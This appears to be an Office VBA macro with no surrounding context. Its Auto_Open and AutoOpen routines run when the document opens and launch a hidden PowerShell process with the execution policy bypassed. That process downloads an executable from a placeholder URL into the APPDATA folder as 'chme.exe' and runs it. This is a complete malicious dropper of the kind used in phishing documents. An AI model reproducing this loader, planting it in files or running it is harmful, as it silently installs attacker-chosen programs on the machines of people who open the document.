Public Function Auto_Open() As Variant
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run ("PowerShell -NoP -sta -NonI -W Hidden -ExecutionPolicy bypass -NoLogo -command ""(New-Object System.Net.WebClient).DownloadFile('<url>',$env:APPDATA+'\chme.exe'); Start-Process $env:APPDATA+'\chme.exe'"" "), 0
    Set WshShell = Nothing
End Function
Sub AutoOpen()
    Auto_Open
End Sub